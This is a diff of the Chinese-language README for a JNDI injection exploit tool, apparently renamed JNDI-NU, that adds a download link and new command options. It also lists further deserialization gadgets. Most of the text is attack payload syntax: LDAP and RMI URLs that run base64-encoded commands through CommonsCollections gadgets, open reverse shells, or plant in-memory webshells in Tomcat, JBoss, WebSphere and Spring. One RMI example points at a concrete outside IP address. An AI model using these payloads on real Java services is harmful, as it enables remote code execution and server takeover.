@@ -16,22 +16,28 @@
 
 本人拥有对此工具的修改和解释权。未经网络安全部门及相关部门允许，不得善自使用本工具进行任何攻击活动，不得以任何方式将其用于商业目的。
 
+## 👾下载
+
+[下载点此处](https://github.com/nuxl1r/JNDI-NU/releases)
+
 ## 😈使用说明
 
-使用 ```java -jar JNDIExploit.jar -h``` 查看参数说明，其中 ```--ip``` 参数为必选参数
+使用 ```java -jar JNDI-NU.jar -h``` 查看参数说明，其中 ```--ip``` 参数为必选参数
 
 ```
-Usage: java -jar JNDIExploit.jar [options]
+Usage: java -jar JNDI-NU.jar [options]
   Options:
   * -i, --ip       Local ip address
     -rl, --rmiPort rmi bind port (default: 10990)
     -l, --ldapPort Ldap bind port (default: 1389)
     -p, --httpPort Http bind port (default: 8080)
+    -c, --command  rmi gadgets System Command
+    -py, --python  Python System Command ex: python3  python2 ...
     -u, --usage    Show usage (default: false)
     -h, --help     Show this help
 ```
 
-使用 ```java -jar JNDIExploit.jar -u``` 查看支持的 LDAP 格式
+使用 ```java -jar JNDI-NU.jar.jar -u``` 查看支持的 LDAP 格式
 ```
 Supported LADP Queries：
 * all words are case INSENSITIVE when send to ldap server
@@ -54,12 +60,20 @@ Supported LADP Queries：
     ldap://0.0.0.0:1389/Basic/JBossMemshell
     ldap://0.0.0.0:1389/Basic/WebsphereMemshell
     ldap://0.0.0.0:1389/Basic/SpringMemshell
+    rmi://42.192.234.204:1099/jilt123 -c [cmd]
 
 [+] Deserialize Queries: ldap://0.0.0.0:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.
     ldap://0.0.0.0:1389/Deserialization/URLDNS/[domain]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/CommonsCollections1_1/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/CommonsCollections2/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/CommonsCollections3/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/CommonsCollections4/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/CommonsCollections5/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollections6/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/CommonsCollections7/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils2/TomcatEcho
     ldap://0.0.0.0:1389/Deserialization/C3P0/SpringEcho
@@ -116,8 +130,18 @@ Supported LADP Queries：
   * ```URLDNS```
   * ```CommonsBeanutils1```  
   * ```CommonsBeanutils2```
+  * ```CommonsCollections1```
+  * ```CommonsCollections1_1```
+  * ```CommonsCollections2```
+  * ```CommonsCollections3```
+  * ```CommonsCollections4```
+  * ```CommonsCollections5```
+  * ```CommonsCollections6```
+  * ```CommonsCollections7```
   * ```CommonsCollectionsK1```
   * ```CommonsCollectionsK2```
+  * ```CommonsCollectionsK3```
+  * ```CommonsCollectionsK4```
   * ```C3P0```
   * ```Jdk7u21```
   * ```Jre8u20```
@@ -230,9 +254,11 @@ public void doFilter(ServletRequest servletRequest, ServletResponse servletRespo
 
 ---
 
+## 🐲建议
+
+建议使用Java11 ，不推荐Java17，Java17可能出现BUG。
 
  ## 📷参考
  * https://github.com/veracode-research/rogue-jndi
  * https://github.com/welk1n/JNDI-Injection-Exploit
  * https://github.com/welk1n/JNDI-Injection-Bypass
-
